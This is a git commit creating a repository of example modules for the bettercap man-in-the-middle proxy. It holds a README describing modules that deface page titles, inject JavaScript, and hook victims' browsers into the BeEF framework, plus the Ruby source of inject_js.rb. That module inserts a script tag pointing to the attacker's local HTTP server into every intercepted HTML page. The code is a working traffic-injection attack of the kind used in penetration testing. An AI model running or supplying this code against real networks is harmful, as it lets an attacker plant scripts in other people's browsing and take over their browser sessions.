98018aba6996f949beb46256025d3484c56f3195
evilsocket <evilsocket@gmail.com>
2015-07-26 17:58:23 +0200

    first commit

---
+++ README.md
@@ -0,0 +1,5 @@
+This repository contains some [bettercap](http://www.bettercap.org/) transparent proxy example modules.
+
+* **hack_title.rb** - Add a "HACKED" text to websites titles.
+* **inject_js.rb** - Will inject a custom javascript ( served from the builtin HTTP server ) into every html page.
+* **beefbox.rb** - Similar to inject_js, but specialized to work with the [BeEF framework](http://beefproject.com).
---
+++ inject_js.rb
@@ -0,0 +1,24 @@
+=begin
+
+BETTERCAP
+
+Author : Simone 'evilsocket' Margaritelli
+Email  : evilsocket@gmail.com
+Blog   : http://www.evilsocket.net/
+
+This project is released under the GPL 3 license.
+
+=end
+class InjectJS < Proxy::Module
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type == 'text/html'
+      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
+      # get the local interface address and HTTPD port
+      localaddr = Context.get.iface[:ip_saddr]
+      localport = Context.get.options[:httpd_port]
+      # inject the js
+      response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script>" )
+    end
+  end
+end
